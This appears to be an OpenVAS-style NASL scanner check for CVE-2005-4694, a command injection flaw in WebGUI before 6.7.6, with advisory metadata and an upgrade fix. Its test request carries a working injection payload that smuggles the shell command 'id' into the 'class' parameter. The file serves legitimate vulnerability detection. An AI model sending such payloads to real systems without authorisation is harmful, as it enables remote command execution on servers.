if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.20014" );
	script_version( "2020-08-25T06:50:30+0000" );
	script_tag( name: "last_modification", value: "2020-08-25 06:50:30 +0000 (Tue, 25 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2005-4694" );
	script_bugtraq_id( 15083 );
	script_xref( name: "OSVDB", value: "19933" );
	script_name( "WebGUI < 6.7.6 arbitrary command execution" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.plainblack.com/getwebgui/advisories/security-exploit-patch-for-6.3-and-above" );
	script_tag( name: "summary", value: "The installed version of WebGUI on the remote host fails to sanitize
  user-supplied input via the 'class' variable to various sources before using it to run commands." );
	script_tag( name: "impact", value: "By leveraging this flaw, an attacker may be
  able to execute arbitrary commands on the remote host within the context of
  the affected web server userid." );
	script_tag( name: "solution", value: "Upgrade to WebGUI 6.7.6 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("list_array_func.inc.sc");
require("port_service_func.inc.sc");
http_check_remote_code( check_request: "/index.pl/homels?func=add;class=WebGUI::Asset::Wobject::Article%3bprint%20%60id%60;", check_result: "uid=[0-9]+.*gid=[0-9]+.*", extra_check: "<meta name=\"generator\" content=\"WebGUI 6", command: "id" );
exit( 99 );

